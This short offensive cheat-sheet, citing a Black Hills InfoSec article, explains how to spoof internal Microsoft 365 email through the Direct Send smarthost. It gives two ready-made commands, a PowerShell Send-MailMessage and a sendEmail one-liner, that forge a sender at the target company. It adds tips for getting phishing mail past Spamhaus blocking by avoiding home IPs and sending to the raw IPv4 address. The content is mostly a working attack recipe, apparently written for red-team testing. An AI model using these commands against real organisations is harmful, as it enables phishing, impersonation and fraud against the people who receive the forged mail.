### Source
https://www.blackhillsinfosec.com/spoofing-microsoft-365-like-its-1995

### Spoofing using Micrsoft Direct Send
```
Prerequisites:
- Microsoft 365 subscription and an Exchange Online Plan
- MX endpoint called Smarthost: <targetDomain-domainComponent>.mail.protection.outlook.com
```

### Spoof message using Microsoft Direct Send
```
Send-MailMessage -SmtpServer <company-com>.mail.protection.outlook.com -To <user>@<company.com> -From <user>@<company.com> -Subject "<subject>" -Body "<body>" -BodyAsHTML
```

### Spoof message using Microsoft Direct Send 
```
cat <file.html> | sendEmail -f "<user>@<company.com>" -u "<subject>" -s "<company-com>.mail.protection.outlook.com" -t "<user>@<company-com>" -o message-content-type=html
```

### Note
```
SPAMHAUS will block most residential IP addresses from sending spoofed emails.
Do not send phishing emails from your house IP adress.

If you get:
... Service unavailable, Client host [...] blocked using Spamhaus. 
-> Try sending using the ipv4 address instead of <company-com>.mail.protection.outlook.com
```

